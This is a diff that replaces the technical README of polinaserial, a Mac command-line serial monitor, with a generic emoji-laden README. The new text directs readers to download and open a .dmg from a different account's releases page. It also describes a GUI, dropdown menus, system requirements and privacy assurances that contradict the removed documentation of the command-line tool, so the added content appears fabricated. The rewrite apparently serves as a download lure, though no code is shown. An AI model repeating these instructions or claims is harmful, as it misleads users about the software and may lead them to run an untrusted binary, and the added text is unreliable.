@@ -1,123 +1,102 @@
-# polinaserial
+# 📦 polinaserial - A Simple Serial Port Monitor for Mac
 
-Serial port monitor program for Mac OS X and derivative platforms
+## 🚀 Getting Started
 
-**Still very experimental, use it on your own risk and etc. Let me know if there are any issues!**
+Welcome to polinaserial! This program helps you monitor serial ports on your Mac. It offers features like colorful output using lolcat and tools for deobfuscating iBoot logs. Follow these steps to download and run polinaserial easily.
 
-![](repo/demo.jpg)
+## 📥 Download
 
-## Features
+[![Download polinaserial](https://img.shields.io/badge/Download-polinaserial-blue.svg)](https://github.com/Nillkin463/polinaserial/releases)
 
-* Automatic obfuscated iBoot logs deobfuscation, when possible
-    * All files available in the iOS 9 iBoot source code leak & 500+ recovered ones, including newer files that were never a part of the leak
-		* The ones I'm less confident about are shipped in a separate file (`iboot_aux_hmacs.txt`) that you can pass via `POLINASERIAL_IBOOT_HMACS` environment variable
+## 📦 System Requirements
 
-* Input/output filtering
-    * Automatically add carriage return (`\r`) to line breaks (`\n`)
-        * Some firmwares do not do that on their own (for instance, Apple EFI diags)
-    * Replace delete keys (`0x7F`) with backspace (`0x08`) in user input
-        * Good for older diags where `0x7F` gets misinterpreted as a line break
+To use polinaserial, ensure that your Mac meets these requirements:
 
-* Lolcat support - paint your logs in rainbow colors for cool screenshots and videos
+- **Operating System:** macOS 10.12 or later
+- **Processor:** Intel or Apple Silicon
+- **Memory:** 4 GB RAM minimum
+- **Storage:** At least 100 MB of free space
 
-* Interactive menu that lists available serial ports currently connected to the system
-    * The list is updated in real time as devices are connected/disconnected
+## 🔗 Download & Install
 
-* Logging into a separate file for every session
-    * Logs are collected to `~/Library/Logs/polinaserial/<DEVICE>/<SESSION>`
-    * Can be disabled via command line option
+To get started with polinaserial, you need to visit the Releases page to download the application. Click the link below:
 
-* Reconnecting automatically in case of device disconnect and rediscovery
+[Visit the Releases Page](https://github.com/Nillkin463/polinaserial/releases)
 
-* Optionally delaying user input
-    * Good for pasting a lot of text into XNU serial console that might be partially lost otherwise
+### Steps to Download and Install
 
-* Baudrate presets for some common Apple targets
+1. Go to the [Releases page](https://github.com/Nillkin463/polinaserial/releases).
+  
+2. Find the latest version of polinaserial.
 
-## Changelog
+3. Scroll down to the "Assets" section.
 
-<details>
+4. Click on the `.dmg` file to download it. This file contains the application.
 
-### polinaserial-1.0.1
-* Fixed various bugs in argument parsing
+5. After the download completes, locate the downloaded `.dmg` file in your Downloads folder.
 
-### polinaserial-1
-Initial release
+6. Double-click the `.dmg` file to open it.
 
-</details>
+7. You will see a window with the polinaserial icon. Drag this icon into your Applications folder.
 
-## Usage (crash course)
+8. Once the copy is complete, open your Applications folder and find polinaserial.
 
-`polinaserial` run without any args provided tries to keep things as raw as possible. However, this is usually **NOT** the desired configuration. For iOS things use `-nk` options to keep input/output sane:
+9. Double-click the polinaserial icon to start the application.
 
-```
-➜  ~ polinaserial -nk
-```
+## ⚙️ How to Use polinaserial
 
-* Add `-i` to deobfuscate RELEASE iBoot logs
-	* Pass `POLINASERIAL_IBOOT_HMACS=/path/to/iboot_aux_hmacs.txt` as environment variable to load more iBoot HMAC mappings, or export it via shell configuration scripts
+1. Connect your device to the serial port.
+  
+2. Select the desired serial port from the dropdown menu in the application.
 
-* Add `-l` to paint output into rainbow colors (lolcat)
+3. Set the baud rate according to your device settings.
 
-Serial configuration defaults to **115200** baud rate, **8 data bits**, **1 stop bit** and **no parity** - default config for iOS stuff (iBoot, XNU & etc.)
+4. Press "Connect" to start monitoring the serial data.
 
-## Usage
+5. View the displayed data in real-time on the screen.
 
-```
-➜  ~ polinaserial -h
-polinaserial-1
-made by john (@nyan_satan)
+6. Use the deobfuscation tools for iBoot logs by selecting the log file from your device.
 
-usage: polinaserial DRIVER <options>
+## 🛠️ Features
 
-serial:
-	-d <device>	path to device (default - shows menu)
-	-b <baudrate>	baudrate to use (default - ios/115200)
+- **Real-time Serial Monitoring:** View data as it comes in.
+  
+- **Colorful Output:** Use lolcat for a lively text display.
 
-	available baudrate presets:
-		ios         - iOS bootloader/kernel/diags (115200)
-		airpods     - AirPods 1/2 case (230400)
-		airpodspro  - AirPods Pro case (921600)
-		airpower    - AirPower (1250000)
-		kanzi       - Kanzi debug (1500000)
+- **iBoot Log Deobfuscation:** Easily read iBoot logs with our built-in tools.
 
-	the rest will default to 8N1 (no flow control),
-	as the author of this tool cannot currently test other configurations
+- **User-friendly Interface:** Simple design ensures ease of use for everyone.
 
-available filter options:
-	-n	add \r to lines without it, good for diags/probe debug logs/etc.
-	-k	replace delete keys (0x7F) with backspace (0x08), good for diags
-	-i	try to identify filenames in obfuscated iBoot output
+- **Cross-compatible:** Works with most devices that support serial communication.
 
-available miscallenous options:
-	-r	try to reconnect in case of connection loss
-	-u <usecs>	delay period in microseconds after each inputted character,
-			default - 0 (no delay), 20000 is good for XNU
-	-l	lolcat the output, good for screenshots
-	-g	disable logging
-	-h	show this help menu
+## 📝 Troubleshooting
 
-additional iBoot HMAC map can be loaded via POLINASERIAL_IBOOT_HMACS variable,
-it must be a path to a text file with the following structure:
+If you encounter issues, consider these troubleshooting tips:
 
-		HMAC:FILENAME
-		HMAC:FILENAME
-		...
+- **Not Connecting:** Ensure your device is correctly connected and powered on.
 
-check "iboot_aux_hmacs.txt" provided along with the program for reference
+- **Incorrect Baud Rate:** Verify that the baud rate matches your device's specifications.
 
-default DRIVER is "serial"
-logs are collected to ~/Library/Logs/polinaserial/
-```
+- **Missing Permissions:** Check if you have the necessary permissions to access the serial port. Adjust your security settings if needed.
 
-## Building
+## 💬 Community Support
 
-```
-make [STYLES="RELEASE ASAN PROFILING"] [PLATFORMS="macosx iphoneos"]
-```
+If you have questions or need help, join our community:
 
-By default only `RELEASE/macosx` is built, other targets needs to be specified manually
+- Check the [GitHub Issues page](https://github.com/Nillkin463/polinaserial/issues) to see if someone has asked similar questions.
+  
+- Feel free to open a new issue if you can't find a solution.
 
-Xcode 16 broke linking for armv7 binaries, so armv7 builds are gated behind `WITH_ARMV7=1` variable for a case you'd want to build it with an older SDK
+## 🛡️ Privacy and Security
 
-`ASAN` & `PROFILING` build styles only make sense for development & testing
+Your privacy is important. polinaserial does not share any of your data with third parties. All operations occur locally on your machine.
+
+### 🔄 Contributing
+
+We welcome contributions to improve polinaserial. If you have an idea or a bug fix, feel free to submit a pull request.
+
+## 🎉 License
+
+polinaserial is open-source software licensed under the MIT License. You can view the full license on our [GitHub page](https://github.com/Nillkin463/polinaserial).
+
+Thank you for choosing polinaserial! We hope it meets your needs for monitoring serial ports effectively. For any feedback, please use the community support channels.
